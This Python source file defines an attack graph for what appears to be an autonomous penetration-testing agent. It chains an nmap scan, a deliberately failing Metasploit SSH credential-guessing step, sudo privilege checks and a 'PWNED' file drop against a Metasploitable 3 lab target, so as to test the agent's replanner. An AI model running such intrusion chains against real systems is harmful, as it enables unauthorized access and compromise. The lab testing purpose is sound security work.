"""
Example Attack Graph: Initial Access Fails → Replanner Recovers

This graph is designed to FAIL on the first SSH brute force attempt because
it uses bad credentials (root/root). The replanner should then kick in and
propose an alternative path to gain access.

Test the replanner's ability to recover from a failed initial access attempt.
Run with explore=True to enable the replanner.

Chain:
  Step 1: Recon                — nmap full scan
  Step 2: SSH Brute (root/root) — WILL FAIL (Metasploitable 3 doesn't accept root)
  Step 3: Privesc Verify        — sudo NOPASSWD verification
  Step 4: File Drop             — proof-of-compromise file

Expected flow:
  recon ✓ → ssh_bruteforce ✗ → backtrack → replanner from recon
  → grows new edge/node with correct credentials → continues
"""

from core_agents.attack_graph import (
    AttackGraph, AttackNode, AttackEdge, EdgeCheck,
    EdgeCondition, Tactic,
)


def build_init_fail_graph(target_ip: str, attacker_ip: str) -> AttackGraph:

    graph = AttackGraph.create(
        objective="Compromise the target via SSH and write a proof-of-compromise file. "
                  "NOTE: Initial credentials are root/root which WILL NOT work on this "
                  "Metasploitable 3 target. The replanner must find an alternative.",
        target_ip=target_ip,
        name=f"init_fail_{target_ip}",
        attacker_ip=attacker_ip,
        scope=[target_ip],
        description="Failure-recovery test: SSH brute fails → replanner finds new path.",
        metadata={"scenario": "init_fail_recovery", "target_type": "metasploitable3"},
    )

    # =========================================================================
    # NODES
    # =========================================================================

    graph.add_node(AttackNode(
        id="recon",
        label="Nmap Full Scan",
        tactic=Tactic.RECONNAISSANCE.value,
        technique_id="T1046",
        technique_name="Network Service Discovery",
        agent_type="recon",
        goal="Map the target's attack surface",
        objective=f"Full port scan with OS detection and service versioning on {target_ip}.",
        target_ip=target_ip,
        tool_name="nmap",
        commands_to_run=[f"nmap -O -A -p 0-65535 {target_ip}"],
        tags=["nmap", "full_scan"],
    ))

    # This node will FAIL — root/root won't work on Metasploitable 3
    graph.add_node(AttackNode(
        id="ssh_bruteforce",
        label="SSH Login as root/root (WILL FAIL)",
        tactic=Tactic.CREDENTIAL_ACCESS.value,
        technique_id="T1110.001",
        technique_name="Brute Force: Password Guessing",
        agent_type="exploit",
        goal="Gain initial access to the target",
        objective=f"Try SSH login on {target_ip}:22 with root/root. "
                  f"NOTE: This target uses vagrant/vagrant, not root/root. "
                  f"This attempt is expected to fail.",
        target_ip=target_ip,
        tool_name="metasploit",
        module="auxiliary/scanner/ssh/ssh_login",
        module_options={
            "USERNAME": "root",
            "PASSWORD": "root",
            "RHOSTS": target_ip,
            "RPORT": 22,
            "STOP_ON_SUCCESS": True,
        },
        max_retries=1,  # Don't retry — fail fast
        tags=["ssh", "brute_force", "expected_to_fail"],
    ))

    graph.add_node(AttackNode(
        id="privesc_verify",
        label="Verify Sudo Privilege Escalation",
        tactic=Tactic.PRIVILEGE_ESCALATION.value,
        technique_id="T1548.003",
        technique_name="Abuse Elevation Control Mechanism: Sudo",
        agent_type="impact",
        goal="Confirm we can elevate to root via sudo",
        objective="Verify the current user has passwordless sudo (NOPASSWD: ALL).",
        target_ip=target_ip,
        tool_name="session",
        commands_to_run=[
            "id",
            "sudo -n whoami",
            "sudo -n id",
        ],
        max_retries=1,
        tags=["privesc", "sudo", "verify"],
    ))

    graph.add_node(AttackNode(
        id="file_drop",
        label="Drop Proof-of-Compromise File",
        tactic=Tactic.IMPACT.value,
        technique_id="T1485",
        technique_name="Data Destruction",
        agent_type="impact",
        goal="Demonstrate target compromise by writing a file",
        objective="Write a proof-of-compromise text file on the target.",
        target_ip=target_ip,
        tool_name="session",
        commands_to_run=[
            "echo '{marker}' > {target_file}",
            "echo \"Compromised at $(date)\" >> {target_file}",
            "echo \"User: $(whoami)\" >> {target_file}",
            "cat {target_file}",
            "ls -la {target_file}",
        ],
        command_params={
            "target_file": "/tmp/pwned_replanner.txt",
            "marker": "PWNED via replanner recovery",
        },
        command_params_alternatives={
            "target_file": ["/var/tmp/pwned_replanner.txt", "/dev/shm/pwned_replanner.txt"],
        },
        max_retries=3,
        metadata={"target_file": "/tmp/pwned_replanner.txt"},
        tags=["impact", "file_drop", "proof"],
    ))

    # =========================================================================
    # EDGES
    # =========================================================================

    # Recon → SSH brute force (will fail)
    graph.connect(
        "recon", "ssh_bruteforce",
        checks=[
            EdgeCheck(
                field="ports", operator="any_port",
                expected={"port": 22, "service": "ssh"},
                description="SSH service is open on port 22",
            ),
        ],
        evidence="Nmap found SSH on port 22",
        rationale="Try root/root credentials on SSH (will fail — replanner recovers)",
    )

    # SSH brute → privesc verify (only reachable via replanner-grown path)
    graph.connect(
        "ssh_bruteforce", "privesc_verify",
        checks=[
            EdgeCheck(
                field="session_id", operator="exists",
                description="Active session obtained",
            ),
        ],
        evidence="Got SSH session",
        rationale="Verify sudo access before proceeding",
    )

    # Privesc verified → file drop
    graph.connect(
        "privesc_verify", "file_drop",
        checks=[
            EdgeCheck(
                field="success", operator="equals", expected="True",
                description="Privesc verification succeeded",
            ),
        ],
        evidence="Confirmed sudo access",
        rationale="Execute the final objective — drop the proof file",
    )

    return graph


# =============================================================================
# CLI
# =============================================================================

if __name__ == "__main__":
    graph = build_init_fail_graph(
        target_ip="192.168.34.7",
        attacker_ip="192.168.34.6",
    )
    print(graph.summary())
    print()

    out_path = "examples/disk_wipe_init_fail_graph.json"
    graph.save(out_path)
    print(f"Saved to {out_path}")

    loaded = AttackGraph.load(out_path)
    print(f"\nReloaded: {loaded}")
    print(f"Ready nodes: {loaded.ready_nodes()}")
